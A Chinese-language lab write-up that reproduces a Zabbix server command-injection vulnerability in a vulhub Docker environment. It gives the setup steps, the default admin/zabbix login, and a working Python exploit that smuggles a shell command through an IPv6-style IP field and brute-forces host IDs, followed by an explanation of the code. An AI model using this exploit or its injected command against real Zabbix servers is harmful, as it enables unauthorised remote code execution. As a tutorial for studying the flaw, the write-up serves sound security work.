**声明：请勿将文章内的相关技术用于非法目的，如有相关非法行为与文章作者和本公众号无关。请遵守《中华人民共和国网络安全法》。**

## 一.漏洞简介

Zabbix是一种由Alexei Vladishev开发的网络监视和管理系统，采用Server-Client架构，用于监控各种网络服务、服务器和网络设备的状态。它提供了实时监控、报警机制、性能统计和数据可视化等广泛功能。然而，尽管Zabbix具有强大的功能，但在过去曾存在一些安全漏洞。例如，在CVE-2017-2824中，Zabbix的Server端trapper
command功能存在一处代码执行漏洞。这个功能允许用户通过Zabbix
Server发送命令到Agent端执行。然而，由于修复补丁的缺陷，攻击者可以通过IPv6进行绕过并注入任意命令，导致远程代码执行。

## 二.影响版本

Zabbix 3.0.x~3.0.30

## 三.靶场搭建

本实验环境采用vulhub快捷搭建，详情请参考官方文档：https://vulhub.org/  
在进入vulhub/zabbix/CVE-2020-11800目录后使用`docker-compose up -d`开启docker靶场

![image](https://image.3001.net/images/20230820/1692533331_64e202536c238d969f9fd.png!small)

然后使用`docker ps`命令查看当前开启靶场的端口号，可以看到一共开启了三个容，分别是zabbix的server端、web端和mysql服务。

![image](https://image.3001.net/images/20230820/1692533339_64e2025b1ca57f4f0a185.png!small)

我们可以看到zabbix的web端开启在8080端口上，所以我们访问`http://your-ip:8080`来访问靶场。

![image](https://image.3001.net/images/20230820/1692533349_64e202651f210e7623b5b.png!small)

因为本漏洞利用需要开启自动注册功能，所以使用默认账号/密码（admin/zabbix）去登录zabbix进行配置

![image](https://image.3001.net/images/20230820/1692533357_64e2026d727aaae0d67a0.png!small)

进入Configuration->Actions后，选择Auto registration，点击Create action（名字随意）

![image](https://image.3001.net/images/20230820/1692533366_64e20276bd3f63b0495f8.png!small)

![image](https://image.3001.net/images/20230820/1692533373_64e2027ddb46e4572cca8.png!small)

然后再创建一个Operations，type选择Add Host，然后点击Add添加，再点击Add保存，这样就配置完成了

![image](https://image.3001.net/images/20230820/1692533381_64e20285cd7884611c2ca.png!small)

![image](https://image.3001.net/images/20230820/1692533389_64e2028dc762c1388ce4f.png!small)

## 四.漏洞复现

由于网上给出的EXP较多，这里我们使用Vulhub官方给出的EXP

    
    
    import sys
    import socket
    import json
    import sys
    
    
    def send(ip, data):
        conn = socket.create_connection(('192.168.136.140', 10051), 10)
        conn.send(json.dumps(data).encode())
        data = conn.recv(2048)
        conn.close()
        return data
    
    
    target = sys.argv[1]
    print(send(target, {"request":"active checks","host":"vulhub","ip":"ffff:::;touch /tmp/success2"}))
    for i in range(10000, 10500):
        data = send(target, {"request":"command","scriptid":1,"hostid":str(i)})
        if data and b'failed' not in data:
            print('hostid: %d' % i)
            print(data)
    

import sys

def send(ip, data):  
conn = socket.create_connection(('192.168.136.140', 10051), 10)  
conn.send(json.dumps(data).encode())  
data = conn.recv(2048)  
conn.close()  
return data

  1. 导入模块：代码开始时导入了sys、socket和json模块，这些模块用于处理命令行参数、进行网络通信和处理JSON数据。

  2. send函数：这个函数用于向Zabbix Server发送数据的封装。它使用socket.create_connection建立到目标IP地址和端口10051的连接，然后发送一个JSON格式的数据，并等待响应。最后，它关闭连接并返回响应数据。

  3. 获取目标IP：通过命令行参数获取目标IP地址，这意味着该脚本用于特定的Zabbix Server目标。

  4. 发送数据给Zabbix Server：使用send函数向目标Zabbix Server发送一个JSON请求。这个请求是"active checks"类型的，其中包括主机名和IP地址等参数。这是测试Zabbix系统的活动检查功能。

  5. 循环：在一个hostid范围内，从10000到10500，循环尝试向目标Zabbix Server发送命令请求。这个请求包含了脚本ID和主机ID等参数。

  6. 检查响应数据：如果响应数据不包含"failed"字样，那么打印出hostid和响应数据。这是用于确认命令是否成功执行的部分。  
恒梦小屋，喜欢您来~  
  

